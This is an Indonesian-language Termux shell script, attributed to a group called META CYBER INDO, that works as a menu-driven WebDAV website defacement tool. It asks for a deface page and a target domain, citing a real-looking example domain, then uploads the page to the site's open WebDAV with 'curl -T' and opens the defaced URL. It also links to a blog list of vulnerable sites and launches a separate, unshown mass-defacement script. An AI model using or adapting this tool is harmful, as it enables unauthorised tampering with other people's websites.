clear
xdg-open https://blog-meta-cyber.web.app
sh pwd.sh
echo "  ==============================================" | lolcat
echo "  ¦ Author   :  </>./Riztrexx</>               ¦ " | lolcat
echo "  ¦ Team     : META CYBER INDO √               ¦ " | lolcat
echo "  ¦ Blog     : https://blog-meta-cyber.web.app ¦ " | lolcat
echo "  ==============================================" | lolcat
echo ""
sleep 1
echo "Pilih" | lolcat
sleep 1
echo "[1] Lanjut Ke Tools Deface Poc Webdav" | lolcat
sleep 1
echo "[2] Kumpulan Web Vuln Webdav" | lolcat
sleep 1
echo "[3] Keluar Dari Program Ini Karna Anda Jomblo? :v" | lolcat
sleep 1
echo "[4] Instal Bahan2 Biar Work" | lolcat
sleep 1
read -p "[?] Pilih Yang Mana : " sayang;
if [ $sayang = 1 ]
then
clear
echo "[1] Mass Deface"
sleep 1
echo "[2] Single Deface"
sleep 1
read -p "[?] Yang Mana : " oo;
fi
if [ $oo = 1 ]
then
pkg install python2
pip2 install requests
clear
python2 99.py
exit
fi
if [ $oo = 2 ]
then
clear
fi
if [ $sayang = 2 ]
then
echo "Tunggu"
xdg-open https://blog-meta-cyber.web.app/pages/kumpulan-web-vuln-webdav-siap-deface-2020.html
sh pwd.sh
clear
fi
if [ $sayang = 3 ]
then
clear
exit
exit
fi
if [ $sayang = 4 ]
then
echo "Harap Tunggu, Sedang Menginstall Bahan2"
sleep 1
pkg install figlet
pkg install toilet
pip2 install lolcat
clear
sh webdav.sh
fi
echo "===========================================" | lolcat
figlet webdav | lolcat
echo "===========================================" | lolcat
echo "Author    :  </>./Riztrexx</>" | lolcat
echo "Team.     :  META CYBER INDO" | lolcat
echo "Blog.     : https://blog-meta-cyber.web.app" | lolcat
echo "===========================================" | lolcat
sleep 3
echo ""
echo "Script Deface Harus diluar Memory Internal" | lolcat
sleep 1
echo "Contoh : [/storage/emulated/0/index.html]" | lolcat
sleep 2
read -p "Masukkan Nama Script Deface : " script;
read -p "Masukkan Web Yang Vuln terhadap Webdav [Tanpa http://] [contoh: ayk.co.za] : " web;
sleep 4
echo "Tunggu......" | lolcat
sleep 2
termux-setup-storage
curl -T /storage/emulated/0/$script $web
echo "Berhasil" | lolcat
read -p "Ingin Melihat Hasil Deface ? y/t : " kol;
if [ $kol = y ]
then
xdg-open http://$web/$script
sleep 5
fi
read -p "Deface Lagi ? y/t : " pil;
if [ $pil = y ]
then
sh webdav.sh
fi
if [ $pil = t ]
then
clear
login
logout
fi
